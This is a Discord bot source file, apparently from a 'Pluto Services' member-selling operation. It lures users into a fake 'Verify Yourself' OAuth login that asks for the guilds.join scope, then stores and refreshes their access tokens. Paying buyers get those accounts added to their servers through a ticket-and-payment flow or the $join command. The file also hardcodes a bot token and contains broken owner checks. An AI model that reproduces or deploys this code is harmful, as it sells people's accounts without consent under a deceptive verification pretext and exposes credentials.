const { Intents, Client,MessageActionRow, MessagePayload, MessageSelectMenu, Modal, MessageEmbed, MessageButton, MessageAttachment, Permissions, TextInputComponent } = require('discord.js');
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES
  ]
});

var express = require("express");
var app = express();
var path = require("path");
var bodyParser = require("body-parser");
const Database = require('st.db')
const usersdata = new Database({
  path: './database/users.json',
  databaseInObject: true
})
const DiscordStrategy = require('passport-discord').Strategy,
  refresh = require('passport-oauth2-refresh');
const passport = require('passport');
const session = require('express-session');
const db = require('pro.db')
const wait = require('node:timers/promises').setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));
const config = require("./config.js");
const { use } = require("passport");
global.config = config;
import('node-fetch')
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

require('./slash.js')
app.get('/', function (req, res) {
  res.send('Hello World')
})

const prefix = config.bot.prefix;

app.listen(3000)
var scopes = ['identify', 'guilds', 'guilds.join'];

passport.use(new DiscordStrategy({
  clientID: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  callbackURL: config.bot.callbackURL,
  scope: scopes
}, async function (accessToken, refreshToken, profile, done) {
  process.nextTick(async function () {
    usersdata.set(`${profile.id}`, {
      accessToken: accessToken,
      refreshToken: refreshToken,
      email: profile.email
    })
    return done(null, profile);
  });
  await oauth.addMember({
    guildId: `${config.bot.GuildId}`,
    userId: profile.id,
    accessToken: accessToken,
    botToken: client.token
  })

}));

app.get("/", function (req, res) {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});

app.use(session({
  secret: 'some random secret',
  cookie: {
    maxAge: 60000 * 60 * 24
  },
  saveUninitialized: false
}));
app.get("/", (req, res) => {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
  var characters = '0123456789';
  let idt = ``
  for (let i = 0; i < 20; i++) {
    idt += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  res.render("login")
});

client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`Verify Yourself`)
      .setStyle(`LINK`)
      .setURL(`${config.bot.TheLinkVerfy}`)
      .setEmoji(`<:cs_member:1215650545113763970>`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `invite`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`Add The Bot`)
      .setStyle(`LINK`)
      .setURL(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=129&scope=bot`)
      .setEmoji(``)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `Please Mention A User` });
    let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `Wrong User` });
    let data = usersdata.get(`${member.id}`)
    if (data) return message.channel.send({ content: `Already Verified` });
    if (!data) return message.channel.send({ content: `Not Verified` });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `Checking..` })
    let alld = usersdata.all()
    let args = message.content.split(` `).slice(1)
    if (!args[0] || !args[1]) return msg.edit({ content: `Sorry, Please Specify A Server` }).catch(() => { message.channel.send({ content: `Sorry, Please Specify A Server` }) });
    let guild = client.guilds.cache.get(`${args[0]}`)
    let amount = args[1]
    let count = 0
    if (!guild) return msg.edit({ content: `Sorry, I Couldn't Find The Server` }).catch(() => { message.channel.send({ content: `Sorry, I Couldn't Find The Server` }) });
    if (amount > alld.length) return msg.edit({ content: `You Can't Enter This Number` }).catch(() => { message.channel.send({ content: `You Can't Enter This Number` }) });
    for (let index = 0; index < amount; index++) {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[index].ID,
        accessToken: alld[index].data.accessToken,
        botToken: client.token
      }).then(() => {
        count++
      }).catch(() => { })
    }
    msg.edit({
      content: `Successfully..\nAdded: \`${count}\`\nI Couldn't Add: \`${amount - count}\`\nRequested: \`${amount}\``
    }).catch(() => {
      message.channel.send({
        content: `Successfully..\nAdded: \`${count}\`\nI Couldn't Add: \`${amount - count}\`\nRequested: \`${amount}\``
      })
    });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel.send({ content: `Refreshing..` }).catch(() => { })
    let alld = usersdata.all()
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth.tokenRequest({
        'clientId': client.user.id,
        'clientSecret': bot.clientSECRET,
        'grantType': 'refresh_token',
        'refreshToken': alld[i].data.refreshToken
      }).then((res) => {
        usersdata.set(`${alld[i].ID}`, {
          accessToken: res.access_token,
          refreshToken: res.refresh_token
        })
        count++
      }).catch(() => {
        usersdata.delete(`${alld[i].ID}`)
      })
    }

    mm.edit({
      content: `Successfully..\nChanged: \`${count}\`\nDeleted: \`${alld.length - count}\``
    }).catch(() => {
      message.channel.send({ content: `Successfully.. ${count}` }).catch(() => { })
    })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `stock`)) {
    let alld = usersdata.all()
    const embed = new MessageEmbed()
      .setAuthor(message.guild.name, message.guild.iconURL({ dynamic: true })).setThumbnail(message.guild.iconURL({ dynamic: true }))
      .setFooter(message.guild.name, message.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Stock Of Members: \`${alld.length}\`\nThe Current Stock Of Members Is: \`${alld.length}\`**`)
    message.reply({ embeds: [embed] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `help`)) {
    let embed = new MessageEmbed()
      .setColor('#0f0098')
      .setAuthor(message.guild.name, message.guild.iconURL({ dynamic: true })).setThumbnail(message.guild.iconURL({ dynamic: true }))
      .setFooter(message.guild.name, message.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Welcome** To The Help List 👋\n\nPlease Choose Some Information From The Buttons Below The Message;`)
    let help = new MessageActionRow()
      .addComponents(
        new MessageButton()
          .setCustomId(`gen`)
          .setLabel(`General Commands.`)
          .setEmoji(`👌`)
          .setStyle(`SECONDARY`),
        new MessageButton()
          .setCustomId(`ad`)
          .setLabel(`Admin Commands.`)
          .setEmoji(`🔒`)
          .setStyle(`SECONDARY`),
      )

    message.reply({ embeds: [embed], components: [help] })
  }
})


client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'gen') {
    const user = await interaction.user.fetch();
    await interaction.reply({
      content: `**General Commands :**\n> /help        , Used To See The Help List.\n> /ping        , Used To Know The Bot's Response Speed.\n> /stock       , Used To Find Out The Number Of Available Members.\n> $price       , Used To Know The Price Of A Number Of Members.`, ephemeral: true
    });
  }
}
);
client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'ad') {
    if (!interaction.user.id == config.bot.owners) return;
    const user = await interaction.user.fetch();
    await interaction.reply({
      content: `**Ticket Commands :**\n> /send-ticket       To Send The Ticket Message\n> $delete-ticket To Delete A Ticket\n> $delete-tickets To Delete All Tickets\n\n**Owners Commands :**\n> /send-stock  , This Command Is Used To Send A Member Inventory Message.\n> /set-price , To Change The Price Of One Member\n> $check To Check If Someone Has Proven Himself Or Not\n> $send To Send A Verify Yourself Message\n> $join To Add Members To The Server\n> $invite To Send A Bot Entry Message\n> $refresh To Refresh Members`, ephemeral: true
    });
  }
}
);

var listeners = app.listen(3004, function () {
  console.log("Your app is listening on port " + `3004`)
});

client.on('ready', () => {
  console.log(`Bot is On! ${client.user.tag}`);
  console.log(`Bot Version ${process.version}`);
});
client.login("MTAwMjcxMzMxMjY2MTg3MjczMQ.GmvpEn.cPA2-hApAK1uzDbSvY54jGteS9tQF-zJseE1ew");
const { AutoKill } = require('autokill')
AutoKill({ Client: client, Time: 5000 })

process.on("unhandledRejection", error => {
  console.log(error)
});

client.on(`interactionCreate`, interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == 'send-ticket') {
    if (!interaction.user.id == config.bot.owners) return;
    const channel = interaction.channel.id;
    const Channel = interaction.guild.channels.cache.get(channel);
    const embed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setImage(config.bot.ticketimg)
      .setTimestamp()
      .setTitle(`Real Member Selling Service`)
      .setDescription(`**To Buy Real Members, Please Click The Button Below To Open A Ticket.\nImportant Notices :\n1. We Do Not Guarantee The Entry Of The Quantity You Purchased In Full Due To Something From Discord.\n2. We Are Not Responsible For Transferring To Another Person.\n3. Please Transfer Inside The Ticket Because You Will Not Be Compensated If The Transfer Is Made Outside The Ticket.**`)
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('openticket')
        .setEmoji('<:emoji_61:1267948783346516092>')
        .setLabel('Buy Now.')
        .setStyle('SECONDARY')
    )
    Channel.send({ components: [row] })
    interaction.reply({ content: `The Ticket Panel Has Been Sent Successfully`, ephemeral: true })
  }
})
client.on(`interactionCreate`, async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId == 'openticket') {
    let y = db.add(`ticket_${interaction.guild.id}`, 1)
                                                                      
    if (y === null || y === 0) y = 1;//-
    if (y === null || y === 0) y = 1;//+ 

    let yy = db.get(`ticket_${interaction.guild.id}`)
    const category = interaction.guild.channels.cache.find(ch => ch.type === 'GUILD_CATEGORY' && ch.name === 'Buy Ticket');
    if (!category) {
      const createdCategory = await interaction.guild.channels.create('Buy Ticket', { type: 'GUILD_CATEGORY' });
      const ticketChannel = await interaction.guild.channels.create(`ticket-${yy}`, { type: 'GUILD_TEXT', parent: createdCategory.id });
    }
    const ticket = await interaction.guild.channels.create(`ticket-${yy}`, {
      type: 'GUILD_TEXT',
      parent: interaction.guild.channels.cache.find(ch => ch.type === 'GUILD_CATEGORY' && ch.name === 'Buy Ticket').id,
      permissionOverwrites: [
        {
          id: interaction.guild.roles.everyone.id,
          deny: ['VIEW_CHANNEL']
        },
        {
          id: interaction.user.id,
          allow: ['VIEW_CHANNEL']
        },
      ]
    })
    const embed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true })).setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setImage("https://media.discordapp.net/attachments/1214989596107079690/1260849542547505203/8BEE0EF9-6CE3-4A1E-98FB-E4BEF69E8288.jpg?ex=66b1c6a4&is=66b07524&hm=8b88fd4057b32630f311965b2ea59187917a74a37f9d452bf1edc0561fe747b0&")
      .setDescription(`**🎟️ Buy Members Ticket.\nـــــــــــــ ـــــــــــــ ـــــــــــــ \n⭐ - You Can Buy The Quantity You Like From The Quantity I Have.\nـــــــــــــ ـــــــــــــ ـــــــــــــ \n💰 Use Credit Bot Currency Only If You Want To Buy In Another Currency, Please Mention The Owner And Inquire.\n⚡ Fast And High Quality Service To Ensure Your Satisfaction, But We Do Not Guarantee The Entry Of The Full Number Of Members Due To Discord.**`)
    const row = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('buyMembers')
        .setLabel('Buy Members.')
        .setEmoji('👤')
        .setStyle('SUCCESS'),
      new MessageButton()
        .setCustomId('how')
        .setLabel('How To Buy.')
        .setEmoji('🤔')
        .setStyle('SECONDARY'),
      new MessageButton()
        .setCustomId('closeTicket')
        .setLabel('Close Ticket.')
        .setEmoji('❌')
        .setStyle('DANGER'),
      new MessageButton()
        .setLabel("Add The Bot.")
        .setStyle("LINK")
        .setEmoji(`🌐`)
        .setURL(`https://discord.com/oauth2/authorize?client_id=1292085473661157417&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fbec31d21-c959-4190-bf26-91ee7adf8675-00-3abxsvfo8s163.sisko.replit.dev%2Flogin&integration_type=0&scope=identify+guilds+email+guilds.join+bot`)
    )
    await ticket.send({ content: `${interaction.user}`, embeds: [embed], components: [row] })
    await interaction.reply({ content: `The Ticket Has Been Successfully Created ${ticket}`, ephemeral: true })
  }
})
client.on("interactionCreate", async (interaction) => {
  if (interaction.customId == 'how') {
    interaction.reply({ content: `Please Follow The Steps In The Explanation:\n|| || `, ephemeral: true })
  }
});
client.on(`interactionCreate`, async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId == 'buyMembers') {
    const BuyModal = new Modal()
      .setCustomId('BuyModal')
      .setTitle('Buy Members');
    const Count = new TextInputComponent()
      .setCustomId('Count')
      .setLabel("Number Of Members")
      .setMinLength(1)
      .setMaxLength(5)
      .setStyle('SHORT');
    const serverid = new TextInputComponent()
      .setCustomId('serverid')
      .setLabel("Server ID")
      .setMinLength(1)
      .setMaxLength(22)
      .setStyle('SHORT');
    const firstActionRow = new MessageActionRow().addComponents(Count);
    const firstActionRow2 = new MessageActionRow().addComponents(serverid);
    BuyModal.addComponents(firstActionRow, firstActionRow2);
    await interaction.showModal(BuyModal);
  } else if (interaction.customId == 'closeTicket') {
    interaction.reply(`The Ticket Will Be Deleted Within 10 Seconds`)
    setTimeout(() => {
      interaction.channel.delete();
    }, 10000);
  }
})
client.on(`interactionCreate`, async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (interaction.customId == 'BuyModal') {
    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = await db.get(`price_${interaction.guild.id}`)
    const member = interaction.member
    const result = Count * price;
    const tax = Math.floor(result * (20 / 19) + 1);
    let alld = usersdata.all()
    let guild = client.guilds.cache.get(`${serverid}`)
    let amount = Count
    let count = 0
    if (!guild) return interaction.reply({
      content: `Sorry, I Couldn't Find The Server That I Entered, Please Enter The Server Through The Button, Check The Server From Above And Try Again..`
    }).catch(() => {
      interaction.channel.send({
        content: `Sorry, I Couldn't Find The Server That I Entered, Please Enter The Server Through The Button, Add Bot To Server From Above And Try Again..`
      })
    });
    if (amount > alld.length) return interaction.reply({
      content: `You Can't Buy This Quantity, I Don't Have This Number Of Members To Know What Quantity You Can Buy, Please Write $stock`
    }).catch(() => {
      interaction.channel.send({
        content: `You Can't Buy This Quantity, I Don't Have This Number Of Members To Know What Quantity You Can Buy, Please Write $stock`
      })
    });
    const tra = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setTitle('Buy Members Process')
      .setDescription(`To Complete The Member Purchase Process, Please Copy The Code Below And Complete The Transfer Process.\n\n\`\`\`\n#credit ${config.bot.TraId} ${tax}\n\`\`\` **`)
    await interaction.reply({ embeds: [tra] });
    const filter = ({ content, author: { id } }) => {
      return (
        content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
        content.includes(config.bot.TraId) &&
        id === "282859044593598464" &&
        (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
      );
    };
    const collector = interaction.channel.createMessageCollector({
      filter,
      max: 1,
    });
    collector.on('collect', async collected => {
      await interaction.deleteReply();
      let msg = await interaction.channel.send({ content: `Im Entering The Members, Please Wait..` })
      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++
        }).catch(() => { })
      }
      msg.edit(`You Have Purchased: \`${amount}\` Members\n${count} Members Have Been Entered\n${amount - count} Members Were Not Entered`).catch(() => {
        message.channel.send(`You Have Purchased: \`${amount}\` Members\n${count} Members Have Been Entered\n${amount - count} Members Were Not Entered`)
      });;
    });
    const role = `${config.bot.clientrole}`
    const re = interaction.guild.roles.cache.get(role)
    await member.roles.add(re)
    const Log = await client.channels.cache.get(config.bot.done)
    const embed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setTitle(`> Members Were Purchased By ${member} The Quantity Purchased Is ${Count} Members`)
      .setDescription(`\`\`\`💫 - Live A Unique Experience With Pluto Services  : discord.gg/pl-s.\`\`\``)
    if (Log) {
      await Log.send({ embeds: [embed] })
    }
  }
})
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == 'send-stock') {
    if (!interaction.user.id == config.bot.owners) return;
    let alld = usersdata.all()
    const embed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true })).setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Stock Of Members: \`${alld.length}\`\nThe Current Stock Of Members Is: \`${alld.length}\`**`)
    const bu = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('stock')
        .setEmoji('🔄')
        .setStyle('SECONDARY')
    )
    interaction.reply({ content: "Done Send Stock Panel✅", ephemeral: true })
    interaction.channel.send({ embeds: [embed], components: [bu] })
  }
});
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return
  if (interaction.customId == 'stock') {
    let alld = usersdata.all()
    const stock = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true })).setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Stock Of Members: \`${alld.length}\`\nThe Current Stock Of Members Is: \`${alld.length}\`**`)
    const bu = new MessageActionRow().addComponents(
      new MessageButton()
        .setCustomId('stock')
        .setEmoji('🔄')
        .setStyle('SECONDARY')
    )
    interaction.reply({ content: "Done Refreshed✅", ephemeral: true })
    interaction.message.edit({ embeds: [stock], components: [bu] })
  }
});
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (message.content.startsWith('$price')) {
    const args = message.content.split(' ');
    const quantity = parseInt(args[1]);
    if (isNaN(quantity)) {
      return message.reply('**Please Enter The Number You Want**');
    }
    const price = await db.get(`price_${interaction.guild.id}`)
    const pricet = price * quantity;
    const tax = Math.floor(pricet * (20 / 19) + 1);
    const msog = await message.reply({
      content: `**${quantity}  × ${price} = ${tax}\n\n---------------------------------   \n\n> Member Price : ${price}\nTo Purchase, Go To The Ticket.`
    });
  }
});
client.on(`interactionCreate`, interaction => {
  if (interaction.commandName == "ping") {
    interaction.reply({
      content: `\`\`\`js\nLatency is ${interaction.createdTimestamp - interaction.createdTimestamp}ms. \nAPI Latency is ${Math.round(client.ws.ping)}ms.\`\`\``
    })
  }
})
client.on(`interactionCreate`, interaction => {
  if (interaction.commandName == "help") {
    let embed = new MessageEmbed()
      .setColor('#0f0098')
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true })).setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Welcome** To The Help List 👋\n\nPlease Choose Some Information From The Buttons Below The Message;`)
    let help = new MessageActionRow()
      .addComponents(
        new MessageButton()
          .setCustomId(`gen`)
          .setLabel(`General Commands.`)
          .setEmoji(`👌`)
          .setStyle(`SECONDARY`),
        new MessageButton()
          .setCustomId(`ad`)
          .setLabel(`Admin Commands.`)
          .setEmoji(`🔒`)
          .setStyle(`SECONDARY`),
      )
    interaction.reply({ embeds: [embed], components: [help] })
  }
})
client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'gen') {
    const user = await interaction.user.fetch();
    await interaction.reply({
      content: `**General Commands :**\n> /help        , Used To See The Help List.\n> /ping        , Used To Know The Bot's Response Speed.\n> /stock       , Used To Find Out The Number Of Available Members.\n> $price       , Used To Know The Price Of A Number Of Members.`, ephemeral: true
    });
  }
}
);
client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'ad') {
    if (!interaction.user.id == config.bot.owners) return;
    const user = await interaction.user.fetch();
    await interaction.reply({
      content: `**Ticket Commands :**\n> /send-ticket       To Send The Ticket Message\n> $delete-ticket To Delete A Ticket\n> $delete-tickets To Delete All Tickets\n\n**Owners Commands :**\n> /send-stock  , This Command Is Used To Send A Member Inventory Message.\n> /set-price , To Change The Price Of One Member\n> $check To Check If Someone Has Proven Himself Or Not\n> $send To Send A Verify Yourself Message\n> $join To Add Members To The Server\n> $invite To Send A Bot Entry Message\n> $refresh To Refresh Members`, ephemeral: true
    });
  }
}
);
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == 'stock') {
    let alld = usersdata.all()
    const embed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true })).setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp()
      .setDescription(`**Stock Of Members: \`${alld.length}\`\nThe Current Stock Of Members Is: \`${alld.length}\`**`)
    interaction.reply({ embeds: [embed] })
  }
});
client.on("messageCreate", async (message) => {
  if (message.content == "$delete-ticket") {
    if (!message.member.permissions.has("ADMINISTRATOR"))
      return message.reply("You Can't Use The Command, My Friend")
    if (message.author.bot) return;
    message.channel.delete();
  }
})
client.on('message', async (message) => {
  if (message.content === '$delete-tickets') {
    if (!message.member.permissions.has("ADMINISTRATOR"))
      return message.reply("You Can't Use The Command, My Friend")
    message.reply("Tickets Have Been Successfully Deleted.")
    message.guild.channels.cache.forEach((channel) => {
      if (channel.name.toLowerCase().startsWith('ticket')) {
        channel.delete().then(() => {
          console.log(`Deleted channel: ${channel.name}`);
        }).catch((error) => {
          console.error(`Failed to delete channel: ${channel.name}, error: ${error}`);
        });
      }
    });
  }
});

let channel = config.bot.fedroom;

client.on("messageCreate", message => {
  if (message.channel.type === "dm" || message.author.bot) return;

  if (channel.includes(message.channel.id)) {
    message.delete();

    let args = message.content.split(',');

    let button = new MessageActionRow()
      .addComponents(
        new MessageButton()
          .setStyle('LINK')
          .setLabel('FROM')
          .setURL(`https://discord.com/users/${message.author.id}`)
      );

    let embed = new MessageEmbed()
      .setAuthor(message.guild.name, message.guild.iconURL({ dynamic: true }))
      .setThumbnail(message.guild.iconURL({ dynamic: true }))
      .setFooter(message.guild.name, message.guild.iconURL({ dynamic: true }))
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setTitle(`Thank You For Your Feedback Honey 🤎`)
      .setDescription(`- Feedback: ${args}`)
      .setColor(message.guild.me.displayColor)
      .setTimestamp();

    message.channel.send({ content: `- <@${message.author.id}>`, embeds: [embed], components: [button] })
      .catch((err) => {
        console.log(err.message);
      });

    message.channel.send(config.bot.line); 
  }
});

client.on(`interactionCreate`, interaction => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == "set-price") {
    if (!interaction.user.id == config.bot.owners) return;
    const price = interaction.options.getString('price');
    db.set(`price_${interaction.guild.id}`, price);
    const donembed = new MessageEmbed()
      .setAuthor(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setThumbnail(interaction.guild.iconURL({ dynamic: true }))
      .setDescription(`The Member Price Has Been Changed To: \`${price}\`.`)
      .setFooter(interaction.guild.name, interaction.guild.iconURL({ dynamic: true }))
      .setTimestamp();
    interaction.reply({ embeds: [donembed] });
  }
});



